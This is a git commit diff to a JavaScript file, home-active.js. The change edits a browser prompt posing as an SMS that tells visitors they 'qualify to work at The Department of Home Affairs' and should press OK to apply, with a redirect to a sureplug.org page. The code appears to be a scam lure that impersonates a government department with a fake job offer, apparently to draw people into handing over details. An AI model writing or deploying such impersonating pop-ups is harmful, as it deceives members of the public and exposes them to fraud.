526d9273d96b4cca7224d74d204f179c4a0eb74d
surepluger <adigunkola666@gmail.com>
2025-04-05 11:43:37 +0100

    Update home-active.js

--- home-active.js
+++ home-active.js
@@ -1,5 +1,5 @@
 var password = 'APPLY NOW'
-password=prompt('SMS: Congratulations, you are qualify at Department of Home Affairs, Press Ok submit application Now ','APPLY NOW');
+password=prompt('SMS: Congratulations, you are qualify to work at The Department of Home Affairs, Press Ok submit application Now ','APPLY NOW');
 if (password != 'APPLY NOW') {
 location.href='https://sureplug.org/homeaffairs';
 }
